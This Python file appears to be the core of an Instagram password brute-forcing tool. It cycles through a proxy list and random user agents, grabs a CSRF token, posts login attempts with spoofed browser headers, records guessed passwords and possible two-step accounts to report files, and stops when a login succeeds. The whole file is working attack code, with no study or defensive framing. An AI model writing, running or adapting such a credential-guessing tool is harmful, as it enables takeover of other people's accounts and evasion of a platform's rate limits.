from conf.user_agent import user_agent
import requests
import random
import json
import os

class SendData:
	def __init__(self, login_url, linked, payload, dir_name, password):
		self.login_url = login_url
		self.linked = linked
		self.payload = payload
		self.dir_name = dir_name
		self.password = password

		with open(f'{self.dir_name}/catch/proxy_list.txt','r') as proxy:
			for pr in proxy:
				print()
				try:
					with requests.Session() as s:
						s.proxies = {
							'http': f'http://{pr}',
							'https': f'http://{pr}',
						}
						random_agent = user_agent[random.randrange(0,9)]
						r = s.get(self.linked)

						csrf = r.cookies['csrftoken']
						r = s.post(self.login_url,data=self.payload,headers={
							"Host": "www.instagram.com",
							"Accept": "*/*",
							"Accept-Language": "en-US,en;q=0.5",
							"Accept-Encoding": "gzip, deflate, br",
							"DNT": "1",
    						"Connection": "keep-alive",
							"user-agent": random_agent,
							"X-Requested-With": "XMLHttpRequest",
							"Referer": self.linked,
							"x-csrftoken":csrf
						},allow_redirects=True)

						s.headers.update({'X-CSRFToken': csrf})

						print(f'Status code: {r.status_code} : ',end="")

						#parse data binary
						data_json = {}
						if 'authenticated' in str(r.content):
							json_str = r.content.decode('utf-8')
							json_objs = json_str.split('\n')
							for obj in json_objs:
								data_json = json.loads(obj)
						else:
							data_json['authenticated'] = False

						if r.status_code == 400:
							print("Maybe it's a two-step verification")
							with open(f'{self.dir_name}/report/maybe_two_step.txt','a+') as mts:
								mts.write(f'{self.password}\n')
						else:
							print()
						
						print(f'Payload -> {self.payload}')
						if(r.status_code == 200):

							with open(f'{self.dir_name}/report/done.txt','a+') as done:
								done.write(f'{self.password}\n')

							#!/check - json()['authenticated']
							# check = '"authenticated": true'
								
							if data_json['authenticated']:
								print(f"PassWord Find [ successful ] => {self.payload}")
								print("data Json => " + data_json)
								os._exit(0)
							else:
								print("[[ The password is wrong ]]")

							break
						else:
							print(f" [[ {pr[:-1]} ]] Faild !!!  Switch Proxy")
				except:
					print("[[ The operation failed. Changing proxy ]]")
					continue
